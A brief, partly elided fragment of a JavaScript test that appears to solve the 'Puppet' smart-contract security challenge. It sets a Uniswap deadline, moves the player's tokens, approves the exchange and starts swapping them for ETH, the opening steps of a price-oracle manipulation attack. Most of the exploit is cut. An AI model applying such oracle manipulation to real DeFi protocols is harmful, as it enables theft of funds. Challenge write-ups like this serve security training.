...
describe("[Challenge] Puppet", function () {
  ...
  it("Execution", async function () {
    ...
    // Calculate a deadline for Uniswap exchange interactions
    const block = await ethers.provider.getBlock("latest");
    const threeDaysInSeconds = 3 * 24 * 60 * 60;
    const deadline = block.timestamp + threeDaysInSeconds;

    // Transfer player tokens to the attacker (which is deployer)
    await token
      .connect(player)
      .transfer(deployer.address, PLAYER_INITIAL_TOKEN_BALANCE);

    // Approve Uniswap exchange for all player's tokens
    await token.approve(uniswapExchange.address, PLAYER_INITIAL_TOKEN_BALANCE);

    // Swap all tokens for Eth
    ...
    // Compute the max deposit required
